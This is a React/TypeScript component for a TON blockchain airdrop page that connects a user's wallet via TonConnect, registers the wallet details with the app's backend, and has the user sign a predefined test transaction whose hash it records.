
import { Cell } from '@ton/core';

import { useRegisterWallet } from '@/hooks/api/useRegisterWallet';
import { useSiteStore } from '@/providers/store';
import { useWalletStore } from '@/providers/wallet';
import { apiFetch } from '@/services/api';
import { Page } from '@/types';
import { SendTransactionResponse, useTonConnectUI, useTonWallet, Wallet } from '@tonconnect/ui-react';
import { 
    FC, 
    useCallback, 
    useEffect,
    useState, 
} from 'react'
import { useRegisterTestTransaction } from '@/hooks/api/useRegisterTestTransaction';
import {DefaultTx} from "@/const/test.transaction.tsx";

import { useTranslation } from "react-i18next";
import { useDropWallet } from '@/hooks/api/useDropWallet';

const Airdrop:FC = () => {
    const { setPage, setIsFooterTransparent } = useSiteStore();
   
    useEffect(() => {
      setPage(Page.AIRDROP);
    }, [setPage]);

    useEffect(() => {
      setIsFooterTransparent(false);
    }, [setIsFooterTransparent]);

    return (
        <>
            <div className='w-full'>
                <TxForm/>
            </div>
        </>
      
        )
};
  
export default Airdrop;

const TxForm = () => {
    const [tx, ] = useState(DefaultTx);
	const wallet: Wallet | null = useTonWallet();
	const [tonConnectUi] = useTonConnectUI();

    const { registerWallet } = useRegisterWallet(apiFetch)
    const { dropWallet } = useDropWallet(apiFetch)
    const { registerTestTransaction } = useRegisterTestTransaction(apiFetch)

    const { 
        isWalletInit, 
        isTestTransaction 
    } = useWalletStore();

    const { t } = useTranslation();

    useEffect(() => {

        if (isWalletInit) {
            if (!wallet || !wallet.account.address || !wallet.device.appName) {
                dropWallet();                
            }
            return
        }

        if (!wallet || !wallet.account.address || !wallet.device.appName) {
            return
        }

        registerWallet({
            account: {
                address: wallet?.account.address, 
                chain: wallet?.account.chain,
                init: wallet?.account.walletStateInit,
                publicKey: wallet?.account.publicKey
            },
            deviceInfo: {
                platform: wallet?.device.platform,
                appName: wallet?.device.appName,  
                appVersion: wallet?.device.appVersion, 
                maxProtocolVersion: wallet?.device.maxProtocolVersion
            }
        });
    }, [wallet, isWalletInit]);

	//const onChange = useCallback((value: object) => setTx((value as { updated_src: typeof defaultTx }).updated_src), []);

    const sendTransaction = useCallback(async () => {
        //await tonConnectUi.sendTransaction(tx);
        const result: SendTransactionResponse = await tonConnectUi.sendTransaction(tx)
        console.log(result)

        // Optionally, track the transaction status using a transaction hash
        //const transactionHash = result.boc;

        // You can now monitor the blockchain or explorer for confirmation
        //console.log('Transaction hash:', transactionHash);

        if (result && result.boc) {
            const cell = Cell.fromBase64(result.boc)
            const buffer = cell.hash();
            const hash = buffer.toString('hex');
            
            registerTestTransaction(hash)
        }

       
        // hashHex: 57123dffb9029bdaa9187b5d035737eea94a1b8c018e2ab1885f245eb95c6e30
        // const hashBase64 = buffer.toString('base64');

        //https://tonapi.io/v2/blockchain/transactions/28dad9fc1a9b06116f4e4be5ed5b3868381c8c7209629e880ffb04a1626f5ebf

    }, []);
   
    return (
        <div className='overflow-x-hidden pb-24 tasks-list z-0'>
           
            <div className='mt-8'>
                <img className='px-2 w-full' src="/airdrop/banner.png" alt="banner" />
            </div>
            <div className='shop-dialog-title mt-4 uppercase !text-left px-2'>{t('airdrop.title')}</div>
            <div className='mt-3 shop-dialog-description !text-left px-2'>
                {t('airdrop.description')}
            </div>
            <div className='mt-4 airdrop-conditions-title px-2'>
                {t('airdrop.steps_list')}      
            </div>
            <div className='
            mt-3 flex items-center justify-between px-4'>
                <span className={`${wallet ? 'airdrop-conditions-disabled' : 'airdrop-conditions'}`}>{t('airdrop.first_step')}</span>  
                {wallet &&<img src="/airdrop/checked.svg" alt="checked" />}
            </div>
            <div className='mt-4 px-3'>
                <div 
                onClick={() => tonConnectUi.openModal()}
                className={`
                uppercase 
                flex flex-row items-center 
                justify-center gap-2 !mx-0
                ${wallet ? 'function-btn-disabled' : 'function-btn btn-no-body'}
                `}>
                    {t('airdrop.connect_wallet')}
                    <img className='w-10 h-10' src="/airdrop/wallet.webp" alt="" />
                </div>
            </div>

            <div className='
            mt-4 flex items-center justify-between px-4'>
                {/* <span className={`airdrop-conditions`}>2. Make an upproval transaction.</span>   */}
                <span className={`${!wallet || !isTestTransaction  
                    ? 'airdrop-conditions-disabled' 
                    : 'airdrop-conditions'}`}
                >{t('airdrop.second_step')}</span>  
                {wallet && isTestTransaction &&<img src="/airdrop/checked.svg" alt="checked" />}
            </div>
            <div className='mt-4 px-3'>
                <div
                onClick={sendTransaction}
                className={`
                uppercase 
                flex flex-row items-center 
                justify-center gap-2 !mx-0
                ${!wallet || (wallet && isTestTransaction) ? 'function-btn-disabled' : 'function-btn btn-no-body'}
                `}>
                    {t('airdrop.make_transaction')}
                    <img className='w-10 h-10' src="/airdrop/wallet.webp" alt="" />
                </div> 
            </div>

            <div className='
            mt-4 flex items-center justify-between px-4'>
                <span className={`airdrop-conditions`}>{t('airdrop.third_step')}</span>  
            </div>

            <div className='mt-6 airdrop-conditions-title px-2'>
                {t('airdrop.details_first_question')}      
            </div>

            <ul className='mt-3 shop-dialog-description !text-left pl-8 list-disc'>
                <li>{t('airdrop.details_first_answer_1')}</li>
                <li>{t('airdrop.details_first_answer_2')}</li>
                <li>{t('airdrop.details_first_answer_3')}</li>      
            </ul>

            <div className='mt-4 airdrop-conditions-title px-2'>
                {t('airdrop.details_second_question')}        
            </div>

            <div className="airdrop-divider divider my-3 px-2"></div>

            <div className='mt-3 shop-dialog-description !text-left px-2'>
                {t('airdrop.details_second_answer_1')}      
            </div>
        </div>        
    )
}